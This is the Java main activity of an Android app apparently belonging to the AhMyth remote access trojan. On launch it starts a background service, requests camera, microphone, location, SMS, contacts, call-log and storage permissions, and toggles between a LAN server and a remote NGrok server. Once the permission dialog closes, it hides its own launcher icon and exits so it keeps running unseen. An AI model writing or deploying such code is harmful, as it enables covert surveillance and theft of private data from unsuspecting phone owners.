package ahmyth.mine.king.ahmyth;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import android.view.View;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private ServerConnectionChecker checker;
    private TextView statusView;
    private Button toggleButton;
    private SharedPreferences prefs;
    
    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_SMS,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        prefs = getSharedPreferences("ahmyth", MODE_PRIVATE);
        checker = new ServerConnectionChecker(this);
        
        // Start Service immediately
        startMainService();
        
        // Setup UI
        statusView = findViewById(R.id.statusView);
        Button btnSettings = findViewById(R.id.btnSettings);
        Button btnDashboard = findViewById(R.id.btnDashboard);
        toggleButton = findViewById(R.id.btnToggleMode);
        Button btnClose = findViewById(R.id.btnClose);
        
        // Dashboard button - MAIN ACTION
        btnDashboard.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(MainActivity.this, DashboardActivity.class));
            }
        });
        
        // Settings button
        btnSettings.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(MainActivity.this, SettingsActivity.class));
            }
        });
        
        // Toggle LAN/Remote
        toggleButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                toggleMode();
            }
        });
        
        // Close button
        btnClose.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                finish();
            }
        });
        
        // Update status periodically
        startStatusUpdateThread();
        
        // Request permissions if needed
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!hasAllPermissions()) {
                requestAllPermissions();
            }
        }
    }

    private void startStatusUpdateThread() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        Thread.sleep(2000); // Update every 2 seconds
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                updateStatus();
                            }
                        });
                    } catch (InterruptedException e) {
                        break;
                    }
                }
            }
        }).start();
    }

    private void updateStatus() {
        String status = checker.getStatusString();
        statusView.setText(status);
        
        // Update toggle button text
        String mode = checker.getPreferredMode();
        if ("LAN".equals(mode)) {
            toggleButton.setText("Switch to Remote (NGrok)");
        } else if ("REMOTE".equals(mode)) {
            toggleButton.setText("Switch to LAN");
        } else {
            toggleButton.setText("No Server Detected");
        }
    }

    private void toggleMode() {
        String currentMode = checker.getPreferredMode();
        SharedPreferences.Editor editor = prefs.edit();
        
        // Swap LAN/Remote by temporarily disabling one
        if ("LAN".equals(currentMode)) {
            // Force use Remote by clearing LAN (user can re-enable in Settings)
            editor.putString("lan_ip", "");
        } else {
            // User needs to go to Settings to configure
            editor.putString("force_remote", "true");
        }
        editor.apply();
        
        updateStatus();
    }

    private boolean hasAllPermissions() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            return true;
        }
        
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        
        if (Build.VERSION.SDK_INT >= 33) {
            if (ContextCompat.checkSelfPermission(this, "android.permission.POST_NOTIFICATIONS") 
                    != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        
        return true;
    }

    private void requestAllPermissions() {
        ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
    }

    private void startMainService() {
        Intent intent = new Intent(this, MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Permissions granted or denied, hide app icon and continue
            hideAppIcon();
            // Close activity immediately to run in background
            finish();
        }
    }

    private void hideAppIcon() {
        // Disable launcher intent filter to hide icon from launcher
        try {
            ComponentName componentName = new ComponentName(
                    MainActivity.this,
                    "ahmyth.mine.king.ahmyth.MainActivity"
            );
            getPackageManager().setComponentEnabledSetting(
                    componentName,
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP
            );
            // Mark that icon has been hidden
            prefs.edit().putBoolean("icon_hidden", true).apply();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
